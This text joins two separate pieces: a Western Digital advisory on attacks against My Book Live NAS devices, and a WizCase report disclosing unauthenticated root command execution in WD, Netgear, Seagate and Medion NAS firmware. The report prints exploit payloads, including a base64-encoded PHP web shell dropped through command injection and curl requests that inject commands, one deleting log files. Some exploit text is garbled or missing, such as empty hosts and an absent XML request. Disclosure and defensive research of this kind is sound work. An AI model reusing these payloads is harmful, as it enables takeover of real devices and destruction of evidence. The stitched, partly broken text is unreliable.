## Recommended Security Measures for WD My Book Live and WD My Book Live Duo

---

**WDC Tracking Number:** WDC-21008

**Product Line:** WD My Book Live and WD My Book Live Duo

**Published:** June 24, 2021

**Last Updated:**  July 6, 2021

Western Digital has determined that Internet-connected My Book Live and My Book Live Duo devices are under attack by exploitation of multiple vulnerabilities present in the device. In some cases, the attackers have triggered a factory reset that appears to erase all data on the device.

**Data Recovery and Product Trade-In Programs**

Western Digital is offering a data recovery service program to help customers who have lost data as a result of these attacks. My Book Live customers are also offered a trade-in program to upgrade to a supported My Cloud device. You can find more details on these programs by following the links below:

* [My Book Live and My Book Live Duo: Data Recovery Service Offer](/support/my-book-live/data-recovery-service-offer)
* [My Book Live and My Book Live Duo: Trade-In Offer](/support/my-book-live/trade-in-offer)

 **Analysis of Newly Identified Vulnerability CVE-2021-35941**

The My Book Live firmware is vulnerable to a remotely exploitable command injection vulnerability when the device has remote access enabled. This vulnerability may be exploited to run arbitrary commands with root privileges. Additionally, the My Book Live is vulnerable to an unauthenticated factory reset operation which allows an attacker to factory reset the device without authentication. The unauthenticated factory reset vulnerability been assigned CVE-2021-35941.

We have heard concerns about the nature of this vulnerability and are sharing technical details to address these questions. We have determined that the unauthenticated factory reset vulnerability was introduced to the My Book Live in April of 2011 as part of a refactor of authentication logic in the device firmware. The refactor centralized the authentication logic into a single file, which is present on the device as `includes/component_config.php` and contains the authentication type required by each endpoint. In this refactor, the authentication logic in `system_factory_restore.php` was correctly disabled, but the appropriate authentication type of `ADMIN_AUTH_LAN_ALL` was not added to `component_config.php`, resulting in the vulnerability. The same refactor removed authentication logic from other files and correctly added the appropriate authentication type to the `component_config.php` file.

**Analysis of the Attack**

We have reviewed log files which we have received from affected customers to understand and characterize the attack. The log files we reviewed show that the attackers directly connected to the affected My Book Live devices from a variety of IP addresses in different countries. Our investigation shows that in some cases, the same attacker exploited both vulnerabilities on the device, as evidenced by the source IP. The first vulnerability was exploited to install a malicious binary on the device, and the second vulnerability was later exploited to reset the device.

On some devices, the attackers installed a trojan with a file named `.nttpd,1-ppc-be-t1-z`, which is a Linux ELF binary compiled for the PowerPC architecture used by the My Book Live and Live Duo. A sample of this trojan has been captured for further analysis and it has been [uploaded to VirusTotal](https://www.virustotal.com/gui/file/9f7edb6383ca58584d3c7bd038aa3bf29f0a544fe1eedb0f8c28af52245b70f0).

Our investigation of this incident has not uncovered any evidence that Western Digital cloud services, firmware update servers, or customer credentials were compromised. As the My Book Live devices can be directly exposed to the internet through port forwarding, the attackers may be able to discover vulnerable devices through port scanning. The vulnerabilities being exploited in this attack are limited to the My Book Live series, which was introduced to the market in 2010 and received a final firmware update in 2015. These vulnerabilities do not affect our current My Cloud product family.

# WizCase Report: Vulnerabilities found on WD My Book, NetGear Stora, SeaGate Home, Medion LifeCloud NAS

NAS devices have become the storage device of choice for many small and medium businesses (SMB). They are **inexpensive, easy to operate, and you can add additional storage** if you’re running low on space. **But is it secure enough to protect your companies data?** That was the question on on our mind when **we brought in security researchers [Paulos Yibelo](https://twitter.com/paulosyibelo) and [Daniel Eshetu](https://twitter.com/kuncho_) to see if they could exploit any vulnerabilities in the the leading NAS devices.**

**We focused on discovering only critical vulnerabilities that can be exploited remotely without any user interaction.** Meaning, authentication bypasses weren’t enough. We wanted to execute commands on the devices remotely with the highest privileges. We were successful, in all the devices. Editor’s Note: We value our relationship with our readers, and we strive to earn your trust through transparency and integrity. We are in the same ownership group as some of the industry-leading products reviewed on this site: ExpressVPN, Cyberghost, Private Internet Access, and Intego. However, this does not affect our review process, as we adhere to a strict testing methodology.

## Summary of Our Findings

We used four popular NAS devices for this project

1. WD My Book,
2. NetGear Stora
3. SeaGate Home
4. Medion LifeCloud NAS

We successfully gained root remote command execution in the devices, and therefore the network they are on, simply by knowing their IP addresses.

* All four NAS devices tested suffer from a zero-day unauthenticated root remote command execution (preauth RCE) vulnerabilities.
* The vulnerabilities **allow hackers, governments, or anyone with malicious intention to read files, add/remove users, add/modify existing data, or execute commands with highest privileges** on all of the devices.
* It is our belief that **there are many other NAS devices that suffer from similar vulnerabilities** as there seems to be a missing pattern of expected from NAS devices.
* Both the vulnerabilities (dubbed **CVE-2018-18472** and **CVE-2018-18471**) remain unpatched at the time of this publication.
* There are **nearly 2 million affected devices** online

## ****CVE-2018-18471 –** XXE and Unauthenticated Remote Command Execution in Axentra Hipserv NAS firmware.**

**Axentra Hipserv is a NAS OS that runs on multiple devices** and provides cloud-based login and file storage and management functionalities for different devices. It’s used in different devices from different vendors, the affected devices sharing the firmware are:

* Netgear Stora
* Seagate GoFlex Home
* Medion LifeCloud (maybe more).

The company provides a firmware with a web interface that mainly uses PHP as a serverside language. The **web interface has a REST API endpoint and a typical web management interface with a file manager support.**

**Firmware Analysis.**

After extracting the firmware and decoding the files, the php files were located in */var/www/html/* with the webroot in */var/www/html/html*. The main handler for the web interface is *homebase.php* and *RESTAPIController.php* is the main handler for the rest API. All the php files were encrypted using IONCube which has a known public decoder and given the version used was an old one, decoding the files didn’t take long.

**Part One: XXE**

After decoding the files**, most of the API endpoints and the web interface were not accessible** without authentication. One of the **few exceptions to this were a few endpoints in the REST API interface**. One of those endpoints is **located at */api/2.0/rest/aggregator/xml*** which loads xml data from POST data, although it uses DOMDocument for loading (parsing) the xml which should not be vulnerable to XXE attacks.

**The version of libxml2 used as a backend in the firmware is an old one. This means that the external entity loading was not disabled by default. which opened the endpoint to exploitation**. Through this it was possible to read files and perform SSRF attacks. An example request is given below

> PUT /xml/aggregator/ HTTP/1.1
>

**The above request caused the xml parser to make a request to our server at 192.168.56.1 for the file XXE\_CHECK**. Although LFI was interesting to grab some sensitive files since XML can’t handle binary data it was not possible to dump the SQLite database to get usernames and passwords.

That meant we are able to read files and make SSRF requests in any of the below devices.

* Netgear Stora
* Seagate GoFlex Home
* Medion LifeCloud

**Part Two: RCE**

**Looking at how the web interface (REST API in particular) performed root actions was the next step.** Since the web server runs as a non-root user **and it had no sudo rights then it was found that the REST API makes calls to a local daemon named oe-spd**, **which runs on port 2000 bound to 127.0.0.1**.

The daemon takes XML data, parses the request and carries out the action without any authentication, except making sure the request came from 127.0.0.1. What’s more, the daemon skips over junk data until it finds the string as shown in the IDA snippet below.

*strstr(\*input\_data, ““);*

This made things a lot easier since the request is going to be sent using the HTTP protocol, skipping over junk data (according to the daemon) was a real help. But, since we can’t directly put the URL in the xml file we make the xml parser send a request to a php script (or anything that does the redirection really) that redirects it to *http://127.0.0.1:2000/a.php?d=\*payload here\**.

Since the daemon is choke full of command execution bugs, it was easy to craft a request that triggered one. Additionally, since the daemon runs with root privileges it’s possible to perform any action on the device. An example payload is given below.

\* This payload uploads a simple php shell */var/www/html/html/u.php* (/u.php?cmd=id).

> *usbejecta`echo PD9waHAKZWNobyAnPHByZT4nOwpzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKZWNobyAnPC9wcmU+JzsKPz4K | base64 -d >/var/www/html/html/u.php`*

## **Putting it all together.**

To chain the vulnerabilities seamlessly we need a server to execute the SSRF vulnerability.

## ****CVE-2018-18472 –**WD MyBook Live Unauthenticated Remote Command Execution**

**WD MyBook Live and some models of WD MyCloud NAS contain a remotely exploitable vulnerability that lets anyone run commands on the device as root**. The vulnerability exists in the language change and modify functionality in the REST API, the following PoC demonstrates this flaw.

**PoC**:

> curl -kX GET -d ‘bim=param’ https:///panel/rest/configuration

**Examples**:

> curl -kX GET -d ‘bim=param`whoami`’ https:///panel/rest/configuration

The poc will create a id.txt file in the webroot containing the output of the ID command. The file can be removed using the following PoC

> curl -kX GET -d ‘bim=param`rm -rf /var/apache2/logs/\*`’ https:///panel/rest/configuration

## **What does this mean to the affected NAS users?**

* If you are using one of the above devices and **they are connected on the WAN, make sure to remove your device from the internet**. (Make sure they are running only locally in safe network)
* Make sure to **contact the affected vendors and insist they release a patch as soon possible**!
* We will update this article as a patch becomes available.
* We also **recommend you use a VPN to protect your computers and mobile devices from hackers**. [ExpressVPN](https://www.wizcase.com/reviews/expressvpn/) and [NordVPN](https://www.wizcase.com/reviews/nordvpn/) both use AES 256-bit  encryption and will secure all your data. (This won’t protect from an NAS attack, but it will protect you from other cyber attacks)
